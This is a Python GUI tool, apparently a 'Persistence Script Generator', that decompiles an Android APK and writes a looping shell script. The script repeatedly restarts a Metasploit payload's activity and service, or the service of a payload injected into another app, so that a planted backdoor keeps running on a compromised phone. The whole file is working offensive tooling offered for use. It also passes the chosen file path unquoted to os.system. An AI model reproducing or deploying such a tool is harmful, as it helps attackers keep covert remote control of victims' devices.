import re
import sys
import os
import shutil
from tkinter import *
import tkinter
from tkinter import filedialog

window = Tk()

apk_path = "No APK selected"

apk_path_lable = tkinter.StringVar()
apk_path_lable.set("No APK selected.")

apk_tool_path = "./Tools/apktool.jar"


def original():
    with open('./Scripts/PersistenceScript.sh', 'w') as f:
        f.write('#!/bin/sh\n'
                'while :\n'
                'do am start --user 0 -a android.intent.action.MAIN -n com.metasploit/.MainActivity\n'
                'am startservice --user 0 com.metasploit.stage/.MainService\n'
                'am start-service --user 0 com.metasploit.stage/.MainService\n'
                'sleep 30\n'
                'done\n')


def merged():
    global line
    with open('temp/AndroidManifest.xml', 'r') as find:
        lines = find.readlines()
        for temp in lines:
            if re.search(r'service', temp):
                line = temp
        result = re.search('android:name="(.*)"/>', line)
        string = result.group(1)
        res = string.rsplit('.', 2)
        with open('./Scripts/PersistenceScript.sh', 'w') as f:
            f.write('#!/bin/bash\n'
                    'while :\n'
                    'do am startservice --user 0 ' +
                    res[0]+'/.'+res[1]+'.'+res[2]+'\n'
                    'am start-service --user 0 ' +
                    res[0]+'/.'+res[1]+'.'+res[2]+'\n'
                    'sleep 10\n'
                    'done')


def browseAPK():
    window.filename = filedialog.askopenfilename(
        initialdir="/", title="Select APK", filetypes=(("apk", "*.apk"), ("apk", "*.apk")))
    global apk_path
    apk_path = window.filename

    apk_path_lable.set("APK selected: " + window.filename)


def execute():
    os.system(apk_tool_path + " d -f " + apk_path + " -o temp")

    exist = 'false'
    with open('temp/AndroidManifest.xml', 'r') as find:
        lines = find.readlines()
        for line in lines:
            if re.search(r'metasploit', line):
                exist = 'true'

        if exist == 'true':
            original()
        elif exist == 'false':
            merged()

    shutil.rmtree("temp")
    print("The script is saved.")


window.title("Persistence Script Generator")

Label(window, text="Script Generator", font="none 15") .grid(
    row=1, column=0, pady=10)

button = tkinter.Button(text="Choose APK", bd=0, command=browseAPK)
button.grid(column=0, row=2, pady=20)


Label(window, textvariable=apk_path_lable, anchor="center",  font="none 7") .grid(
    row=3, column=0, pady=10)

button2 = tkinter.Button(text="Generate Script", bd=0,
                         command=execute, width=50)
button2.grid(column=0, row=5, pady=10)

window.resizable(width=False, height=False)
window.mainloop()

print(os.path.dirname(os.path.abspath(__file__)))
